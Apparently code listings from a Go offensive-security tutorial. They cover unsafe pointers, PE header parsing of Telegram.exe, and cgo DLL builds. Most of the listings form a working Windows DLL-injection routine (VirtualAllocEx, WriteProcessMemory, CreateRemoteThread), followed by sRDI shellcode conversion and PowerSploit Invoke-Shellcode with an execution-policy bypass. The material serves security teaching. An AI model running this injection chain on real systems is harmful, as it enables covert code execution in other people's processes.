["```\nfunc state() {\nvar onload = createEvents(\"onload\") ❶\n    var receive = createEvents(\"receive\") ❷\n    var success = createEvents(\"success\") ❸\n\n    mapEvents := make(map[string]interface{})\n    mapEvents[\"messageOnload\"] = unsafe.Pointer(onload)\n    mapEvents[\"messageReceive\"] = unsafe.Pointer(receive) ❹\n    mapEvents[\"messageSuccess\"] = uintptr(unsafe.Pointer(success)) ❺\n\n    //This line is safe - retains orginal value\n    fmt.Println(*(*string)(mapEvents[\"messageReceive\"].(unsafe.Pointer))) ❻\n\n    //This line is unsafe - original value could be garbage collected\n    fmt.Println(*(*string)(unsafe.Pointer(mapEvents[\"messageSuccess\"].(uintptr)))) ❼\n}\n\nfunc createEvents(s string)❽ *string {\n    return &s\n}\n```", "```\nfunc state() {\nvar onload = createEvents(\"onload\")\n    var receive = createEvents(\"receive\")\n    var success❶ = createEvents(\"success\")\n\n    mapEvents := make(map[string]interface{})\n    mapEvents[\"messageOnload\"] = unsafe.Pointer(onload)\n    mapEvents[\"messageReceive\"] = unsafe.Pointer(receive)\n    mapEvents[\"messageSuccess\"] = uintptr(unsafe.Pointer(success))❷\n\n    //This line is safe - retains orginal value\n    fmt.Println(*(*string)(mapEvents[\"messageReceive\"].(unsafe.Pointer)))\n\n    //This line is unsafe - original value could be garbage collected\n    fmt.Println(*(*string)(unsafe.Pointer(mapEvents[\"messageSuccess\"].(uintptr))))\n\n    runtime.KeepAlive(success) ❸\n}\n\nfunc createEvents(s string) *string {\n    return &s\n}\n```", "```\nimport \"syscall\"\n\nvar (\n ❶ ModKernel32 = syscall.NewLazyDLL(\"kernel32.dll\")\n    modUser32   = syscall.NewLazyDLL(\"user32.dll\")\n    modAdvapi32 = syscall.NewLazyDLL(\"Advapi32.dll\")\n\n    ProcOpenProcessToken      = modAdvapi32.NewProc(\"GetProcessToken\")\n    ProcLookupPrivilegeValueW = modAdvapi32.NewProc(\"LookupPrivilegeValueW\")\n    ProcLookupPrivilegeNameW  = modAdvapi32.NewProc(\"LookupPrivilegeNameW\")\n    ProcAdjustTokenPrivileges = modAdvapi32.NewProc(\"AdjustTokenPrivileges\")\n    ProcGetAsyncKeyState      = modUser32.NewProc(\"GetAsyncKeyState\")\n    ProcVirtualAlloc          = ModKernel32.NewProc(\"VirtualAlloc\")\n    ProcCreateThread          = ModKernel32.NewProc(\"CreateThread\")\n    ProcWaitForSingleObject   = ModKernel32.NewProc(\"WaitForSingleObject\")\n    ProcVirtualAllocEx        = ModKernel32.NewProc(\"VirtualAllocEx\")\n    ProcVirtualFreeEx         = ModKernel32.NewProc(\"VirtualFreeEx\")\n    ProcCreateRemoteThread    = ModKernel32.NewProc(\"CreateRemoteThread\")\n    ProcGetLastError          = ModKernel32.NewProc(\"GetLastError\")\n    ProcWriteProcessMemory    = ModKernel32.NewProc(\"WriteProcessMemory\")\n ❷ ProcOpenProcess           = ModKernel32.NewProc(\"OpenProcess\")\n    ProcGetCurrentProcess     = ModKernel32.NewProc(\"GetCurrentProcess\")\n    ProcIsDebuggerPresent     = ModKernel32.NewProc(\"IsDebuggerPresent\")\n    ProcGetProcAddress        = ModKernel32.NewProc(\"GetProcAddress\")\n    ProcCloseHandle           = ModKernel32.NewProc(\"CloseHandle\")\n    ProcGetExitCodeThread     = ModKernel32.NewProc(\"GetExitCodeThread\")\n)\n```", "```\nHANDLE OpenProcess(\n  DWORD❶ dwDesiredAccess,\n  BOOL  bInheritHandle,\n  DWORD dwProcessId\n);\n```", "```\nconst (\n    // docs.microsoft.com/en-us/windows/desktop/ProcThread/process-security-and-access-rights\n    PROCESS_CREATE_PROCESS            = 0x0080\n    PROCESS_CREATE_THREAD             = 0x0002\n    PROCESS_DUP_HANDLE                = 0x0040\n    PROCESS_QUERY_INFORMATION         = 0x0400\n    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000\n    PROCESS_SET_INFORMATION           = 0x0200\n    PROCESS_SET_QUOTA                 = 0x0100\n    PROCESS_SUSPEND_RESUME            = 0x0800\n PROCESS_TERMINATE                 = 0x0001\n    PROCESS_VM_OPERATION              = 0x0008\n    PROCESS_VM_READ                   = 0x0010\n    PROCESS_VM_WRITE                  = 0x0020\n    PROCESS_ALL_ACCESS                = 0x001F0FFF\n)\n```", "```\ntype Inject struct {\n    Pid              uint32\n    DllPath          string\n    DLLSize          uint32\n    Privilege        string\n    RemoteProcHandle uintptr\n    Lpaddr           uintptr\n    LoadLibAddr      uintptr\n    RThread          uintptr\n    Token            TOKEN\n}\n\ntype TOKEN struct {\n    tokenHandle syscall.Token\n}\n```", "```\nfunc OpenProcessHandle(i *Inject) error {\n    ❶ var rights uint32 = PROCESS_CREATE_THREAD |\n        PROCESS_QUERY_INFORMATION |\n        PROCESS_VM_OPERATION |\n        PROCESS_VM_WRITE |\n        PROCESS_VM_READ\n    ❷ var inheritHandle uint32 = 0\n    ❸ var processID uint32 = i.Pid\n    ❹ remoteProcHandle, _, lastErr❺ := ProcOpenProcess.Call❻(\n        uintptr(rights), // DWORD dwDesiredAccess\n        uintptr(inheritHandle), // BOOL  bInheritHandle\n        uintptr(processID)) // DWORD dwProcessId\n    if remoteProcHandle == 0 {\n        return errors.Wrap(lastErr, `[!] ERROR :\n Can't Open Remote Process. Maybe running w elevated integrity?`)\n    }\n    i.RemoteProcHandle = remoteProcHandle\n    fmt.Printf(\"[-] Input PID: %v\\n\", i.Pid)\n    fmt.Printf(\"[-] Input DLL: %v\\n\", i.DllPath)\n    fmt.Printf(\"[+] Process handle: %v\\n\", unsafe.Pointer(i.RemoteProcHandle))\n    return nil\n}\n```", "```\nfunc VirtualAllocEx(i *Inject) error {\n    var flAllocationType uint32 = MEM_COMMIT | MEM_RESERVE\n    var flProtect uint32 = PAGE_EXECUTE_READWRITE\n    lpBaseAddress, _, lastErr := ProcVirtualAllocEx.Call(\n        i.RemoteProcHandle, // HANDLE hProcess\n        uintptr(nullRef), // LPVOID lpAddress ❶\n        uintptr(i.DLLSize), // SIZE_T dwSize\n        uintptr(flAllocationType), // DWORD  flAllocationType\n        // https://docs.microsoft.com/en-us/windows/desktop/Memory/memory-protection-constants\nuintptr(flProtect)) // DWORD  flProtect\n    if lpBaseAddress == 0 {\n        return errors.Wrap(lastErr, \"[!] ERROR : Can't Allocate Memory On Remote Process.\")\n    }\n    i.Lpaddr = lpBaseAddress\n    fmt.Printf(\"[+] Base memory address: %v\\n\", unsafe.Pointer(i.Lpaddr))\n    return nil\n}\n```", "```\nfunc WriteProcessMemory(i *Inject) error {\n    var nBytesWritten *byte\n    dllPathBytes, err := syscall.BytePtrFromString(i.DllPath) ❶\n    if err != nil {\n        return err\n    }\n    writeMem, _, lastErr := ProcWriteProcessMemory.Call(\n        i.RemoteProcHandle, // HANDLE  hProcess\n        i.Lpaddr, // LPVOID  lpBaseAddress\n        uintptr(unsafe.Pointer(dllPathBytes)), // LPCVOID lpBuffer ❷\n        uintptr(i.DLLSize), // SIZE_T  nSize\n        uintptr(unsafe.Pointer(nBytesWritten))) // SIZE_T  *lpNumberOfBytesWritten\n    if writeMem == 0 {\n        return errors.Wrap(lastErr, \"[!] ERROR : Can't write to process memory.\")\n    }\n    return nil\n}\n```", "```\nfunc GetLoadLibAddress(i *Inject) error {\n    var llibBytePtr *byte\n    llibBytePtr, err := syscall.BytePtrFromString(\"LoadLibraryA\") ❶\n    if err != nil {\n        return err\n    }\n    lladdr, _, lastErr := ProcGetProcAddress.Call❷(\n        ModKernel32.Handle(), // HMODULE hModule ❸\n        uintptr(unsafe.Pointer(llibBytePtr))) // LPCSTR lpProcName ❹\n    if &lladdr == nil {\n        return errors.Wrap(lastErr, \"[!] ERROR : Can't get process address.\")\n    }\n    i.LoadLibAddr = lladdr\n    fmt.Printf(\"[+] Kernel32.Dll memory address: %v\\n\", unsafe.Pointer(ModKernel32.Handle()))\n    fmt.Printf(\"[+] Loader memory address: %v\\n\", unsafe.Pointer(i.LoadLibAddr))\n    return nil\n}\n```", "```\nfunc CreateRemoteThread(i *Inject) error {\n    var threadId uint32 = 0\n    var dwCreationFlags uint32 = 0\n    remoteThread, _, lastErr := ProcCreateRemoteThread.Call❶(\n        i.RemoteProcHandle, // HANDLE hProcess ❷\n        uintptr(nullRef), // LPSECURITY_ATTRIBUTES lpThreadAttributes\n        uintptr(nullRef), // SIZE_T dwStackSize\n        i.LoadLibAddr, // LPTHREAD_START_ROUTINE lpStartAddress ❸\n        i.Lpaddr, // LPVOID lpParameter ❹\n        uintptr(dwCreationFlags), // DWORD dwCreationFlags\n        uintptr(unsafe.Pointer(&threadId)), // LPDWORD lpThreadId\n    )\n    if remoteThread == 0 {\n        return errors.Wrap(lastErr, \"[!] ERROR : Can't Create Remote Thread.\")\n    }\n    i.RThread = remoteThread\n    fmt.Printf(\"[+] Thread identifier created: %v\\n\", unsafe.Pointer(&threadId))\n    fmt.Printf(\"[+] Thread handle created: %v\\n\", unsafe.Pointer(i.RThread))\n    return nil\n}\n```", "```\nfunc WaitForSingleObject(i *Inject) error {\n    var dwMilliseconds uint32 = INFINITE\n    var dwExitCode uint32\n    rWaitValue, _, lastErr := ProcWaitForSingleObject.Call( ❶\n        i.RThread, // HANDLE hHandle\n        uintptr(dwMilliseconds)) // DWORD  dwMilliseconds\n    if rWaitValue != 0 {\n        return errors.Wrap(lastErr, \"[!] ERROR : Error returning thread wait state.\")\n    }\n    success, _, lastErr := ProcGetExitCodeThread.Call( ❷\n i.RThread, // HANDLE  hThread\n        uintptr(unsafe.Pointer(&dwExitCode))) // LPDWORD lpExitCode\n    if success == 0 {\n        return errors.Wrap(lastErr, \"[!] ERROR : Error returning thread exit code.\")\n    }\n    closed, _, lastErr := ProcCloseHandle.Call(i.RThread) // HANDLE hObject ❸\n    if closed == 0 {\n        return errors.Wrap(lastErr, \"[!] ERROR : Error closing thread handle.\")\n    }\n    return nil\n}\n```", "```\nfunc VirtualFreeEx(i *Inject) error {\n    var dwFreeType uint32 = MEM_RELEASE\n    var size uint32 = 0 //Size must be 0 to MEM_RELEASE all of the region\n    rFreeValue, _, lastErr := ProcVirtualFreeEx.Call❶(\n        i.RemoteProcHandle, // HANDLE hProcess ❷\n        i.Lpaddr, // LPVOID lpAddress ❸\n        uintptr(size), // SIZE_T dwSize ❹\n        uintptr(dwFreeType)) // DWORD dwFreeType ❺\n    if rFreeValue == 0 {\n        return errors.Wrap(lastErr, \"[!] ERROR : Error freeing process memory.\")\n    }\n    fmt.Println(\"[+] Success: Freed memory region\")\n    return nil\n}\n```", "```\nimport (\n ❶ \"debug/pe\"\n    \"encoding/binary\"\n    \"fmt\"\n    \"io\"\n    \"log\"\n    \"os\"\n)\n\nfunc main() {\n ❷ f, err := os.Open(\"Telegram.exe\")\n    check(err)\n ❸ pefile, err := pe.NewFile(f)\n    check(err)\n    defer f.Close()\n    defer pefile.Close()\n```", "```\n    dosHeader := make([]byte, 96)\n    sizeOffset := make([]byte, 4)\n\n    // Dec to Ascii (searching for MZ)\n    _, err = f.Read(dosHeader) ❶\n    check(err)\n    fmt.Println(\"[-----DOS Header / Stub-----]\")\n    fmt.Printf(\"[+] Magic Value: %s%s\\n\", string(dosHeader[0]), string(dosHeader[1])) ❷\n\n    // Validate PE+0+0 (Valid PE format)\n    pe_sig_offset := int64(binary.LittleEndian.Uint32(dosHeader[0x3c:])) ❸\n    f.ReadAt(sizeOffset[:], pe_sig_offset) ❹\n    fmt.Println(\"[-----Signature Header-----]\")\n    fmt.Printf(\"[+] LFANEW Value: %s\\n\", string(sizeOffset))\n\n/* OUTPUT\n[-----DOS Header / Stub-----]\n[+] Magic Value: MZ\n[-----Signature Header-----]\n[+] LFANEW Value: PE\n*/\n```", "```\n  // Create the reader and read COFF Header\n❶ sr := io.NewSectionReader(f, 0, 1<<63-1)\n❷ _, err := sr.Seek(pe_sig_offset+4, os.SEEK_SET)\n  check(err)\n❸ binary.Read(sr, binary.LittleEndian, &pefile.FileHeader)\n```", "```\ntype FileHeader struct {\n        Machine              uint16\n        NumberOfSections     uint16\n        TimeDateStamp        uint32\n        PointerToSymbolTable uint32\n        NumberOfSymbols      uint32\n        SizeOfOptionalHeader uint16\n        Characteristics      uint16\n}\n```", "```\n    // Print File Header\n    fmt.Println(\"[-----COFF File Header-----]\")\n    fmt.Printf(\"[+] Machine Architecture: %#x\\n\", pefile.FileHeader.Machine)\n    fmt.Printf(\"[+] Number of Sections: %#x\\n\", pefile.FileHeader.NumberOfSections)\n    fmt.Printf(\"[+] Size of Optional Header: %#x\\n\", pefile.FileHeader.SizeOfOptionalHeader)\n    // Print section names\n    fmt.Println(\"[-----Section Offsets-----]\")\n    fmt.Printf(\"[+] Number of Sections Field Offset: %#x\\n\", pe_sig_offset+6) ❶\n    // this is the end of the Signature header (0x7c) + coff (20bytes) + oh32 (224bytes)\n    fmt.Printf(\"[+] Section Table Offset: %#x\\n\", pe_sig_offset+0xF8)\n\n /* OUTPUT\n[-----COFF File Header-----]\n[+] Machine Architecture: 0x14c ❷\n[+] Number of Sections: 0x8 ❸\n[+] Size of Optional Header: 0xe0 ❹\n[-----Section Offsets-----]\n[+] Number of Sections Field Offset: 0x15e ❺\n[+] Section Table Offset: 0x250 ❻\n*/\n```", "```\n  // Get size of OptionalHeader\n❶ var sizeofOptionalHeader32 = uint16(binary.Size(pe.OptionalHeader32{}))\n❷ var sizeofOptionalHeader64 = uint16(binary.Size(pe.OptionalHeader64{}))\n❸ var oh32 pe.OptionalHeader32\n❹ var oh64 pe.OptionalHeader64\n\n  // Read OptionalHeader\n  switch pefile.FileHeader.SizeOfOptionalHeader {\n  case sizeofOptionalHeader32:\n   ❺ binary.Read(sr, binary.LittleEndian, &oh32)\n  case sizeofOptionalHeader64:\n      binary.Read(sr, binary.LittleEndian, &oh64)\n  }\n```", "```\n    // Print Optional Header\n    fmt.Println(\"[-----Optional Header-----]\")\n    fmt.Printf(\"[+] Entry Point: %#x\\n\", oh32.AddressOfEntryPoint)\n    fmt.Printf(\"[+] ImageBase: %#x\\n\", oh32.ImageBase)\n    fmt.Printf(\"[+] Size of Image: %#x\\n\", oh32.SizeOfImage)\n    fmt.Printf(\"[+] Sections Alignment: %#x\\n\", oh32.SectionAlignment)\n    fmt.Printf(\"[+] File Alignment: %#x\\n\", oh32.FileAlignment)\n    fmt.Printf(\"[+] Characteristics: %#x\\n\", pefile.FileHeader.Characteristics)\n    fmt.Printf(\"[+] Size of Headers: %#x\\n\", oh32.SizeOfHeaders)\n    fmt.Printf(\"[+] Checksum: %#x\\n\", oh32.CheckSum)\n    fmt.Printf(\"[+] Machine: %#x\\n\", pefile.FileHeader.Machine)\n    fmt.Printf(\"[+] Subsystem: %#x\\n\", oh32.Subsystem)\n    fmt.Printf(\"[+] DLLCharacteristics: %#x\\n\", oh32.DllCharacteristics)\n/* OUTPUT\n[-----Optional Header-----]\n[+] Entry Point: 0x169e682 ❶\n[+] ImageBase: 0x400000 ❷\n[+] Size of Image: 0x3172000 ❸\n[+] Sections Alignment: 0x1000 ❹\n[+] File Alignment: 0x200 ❺\n[+] Characteristics: 0x102\n[+] Size of Headers: 0x400\n[+] Checksum: 0x2e41078\n[+] Machine: 0x14c\n[+] Subsystem: 0x2\n[+] DLLCharacteristics: 0x8140\n*/\n```", "```\n    // Print Data Directory\n    fmt.Println(\"[-----Data Directory-----]\")\n    var winnt_datadirs = []string{ ❶\n        \"IMAGE_DIRECTORY_ENTRY_EXPORT\",\n        \"IMAGE_DIRECTORY_ENTRY_IMPORT\",\n        \"IMAGE_DIRECTORY_ENTRY_RESOURCE\",\n        \"IMAGE_DIRECTORY_ENTRY_EXCEPTION\",\n        \"IMAGE_DIRECTORY_ENTRY_SECURITY\",\n        \"IMAGE_DIRECTORY_ENTRY_BASERELOC\",\n        \"IMAGE_DIRECTORY_ENTRY_DEBUG\",\n        \"IMAGE_DIRECTORY_ENTRY_COPYRIGHT\",\n        \"IMAGE_DIRECTORY_ENTRY_GLOBALPTR\",\n        \"IMAGE_DIRECTORY_ENTRY_TLS\",\n        \"IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG\",\n        \"IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT\",\n        \"IMAGE_DIRECTORY_ENTRY_IAT\",\n        \"IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT\",\n        \"IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR\",\n        \"IMAGE_NUMBEROF_DIRECTORY_ENTRIES\",\n    }\n   for idx, directory := range oh32.DataDirectory { ❷\n        fmt.Printf(\"[!] Data Directory: %s\\n\", winnt_datadirs[idx])\n        fmt.Printf(\"[+] Image Virtual Address: %#x\\n\", directory.VirtualAddress)\n        fmt.Printf(\"[+] Image Size: %#x\\n\", directory.Size)\n    }\n/* OUTPUT\n[-----Data Directory-----]\n[!] Data Directory: IMAGE_DIRECTORY_ENTRY_EXPORT ❸\n[+] Image Virtual Address: 0x2a7b6b0 ❹\n[+] Image Size: 0x116c ❺\n[!] Data Directory: IMAGE_DIRECTORY_ENTRY_IMPORT ❻\n [+] Image Virtual Address: 0x2a7c81c\n [+] Image Size: 0x12c\n--snip--\n*/\n```", "```\n s := pefile.Section(\".text\")\n    fmt.Printf(\"%v\", *s)\n/* Output\n{{.text 25509328 4096 25509376 1024 0 0 0 0 1610612768} [] 0xc0000643c0 0xc0000643c0}\n*/\n```", "```\n    fmt.Println(\"[-----Section Table-----]\")\n    for _, section := range pefile.Sections { ❶\n        fmt.Println(\"[+] --------------------\")\n        fmt.Printf(\"[+] Section Name: %s\\n\", section.Name)\n        fmt.Printf(\"[+] Section Characteristics: %#x\\n\", section.Characteristics)\n        fmt.Printf(\"[+] Section Virtual Size: %#x\\n\", section.VirtualSize)\n        fmt.Printf(\"[+] Section Virtual Offset: %#x\\n\", section.VirtualAddress)\n        fmt.Printf(\"[+] Section Raw Size: %#x\\n\", section.Size)\n        fmt.Printf(\"[+] Section Raw Offset to Data: %#x\\n\", section.Offset)\n        fmt.Printf(\"[+] Section Append Offset (Next Section): %#x\\n\", section.Offset+section.Size)\n    }\n\n/* OUTPUT\n[-----Section Table-----]\n[+] --------------------\n[+] Section Name: .text ❷\n[+] Section Characteristics: 0x60000020 ❸\n[+] Section Virtual Size: 0x1853dd0 ❹\n[+] Section Virtual Offset: 0x1000 ❺\n[+] Section Raw Size: 0x1853e00 ❻\n[+] Section Raw Offset to Data: 0x400 ❼\n[+] Section Append Offset (Next Section): 0x1854200 ❽\n[+] --------------------\n[+] Section Name: .rodata\n[+] Section Characteristics: 0x60000020\n[+] Section Virtual Size: 0x1b00\n[+] Section Virtual Offset: 0x1855000\n[+] Section Raw Size: 0x1c00\n[+] Section Raw Offset to Data: 0x1854200\n[+] Section Append Offset (Next Section): 0x1855e00\n--snip--\n*/\n```", "```\n   package main\n\n❶ /*\n   #include <stdio.h>\n   #include <windows.h>\n\n❷ void box()\n   {\n       MessageBox(0, \"Is Go the best?\", \"C GO GO\", 0x00000004L);\n   }\n   */\n❸ import \"C\"\n   func main() {\n\n    ❹ C.box()\n   }\n```", "```\n   package main\n❶ import \"C\"\n   import \"fmt\"\n❷ //export Start\n❸ func Start() {\n       fmt.Println(\"YO FROM GO\")\n   }\n\n❹ func main() {\n   }\n```", "```\n> go build -buildmode=c-archive\n```", "```\n#include \"dllshellcode.h\"\nvoid (*table[1]) = {Start};\n```", "```\n> gcc -shared -pthread -o x.dll scratch.c dllshellcode.a -lWinMM -lntdll -lWS2_32\n```", "```\n>>> from ShellCodeRDI import *\n>>> HashFunctionName('Start')\n1168596138\n```", "```\nc:\\tools\\PowerSploit\\CodeExecution> powershell.exe -exec bypass\nWindows PowerShell\nCopyright (C) 2016 Microsoft Corporation. All rights reserved.\n```", "```\nPS C:\\tools\\PowerSploit\\CodeExecution> Import-Module .\\Invoke-Shellcode.ps1\nPS C:\\tools\\PowerSploit\\CodeExecution> cd ..\\..\\sRDI\nPS C:\\tools\\sRDI> cd .\\PowerShell\\\nPS C:\\tools\\sRDI\\PowerShell> Import-Module .\\ConvertTo-Shellcode.ps1\n```", "```\nPS C:\\tools\\sRDI\\PowerShell> Invoke-Shellcode -Shellcode (ConvertTo-Shellcode\n-File C:\\Users\\tom\\Downloads\\x.dll -FunctionHash 1168596138)\n\nInjecting shellcode into the running PowerShell process!\nDo you wish to carry out your evil plans?\n[Y] Yes  [N] No  [S] Suspend  [?] Help (default is \"Y\"): Y\nYO FROM GO\n```"]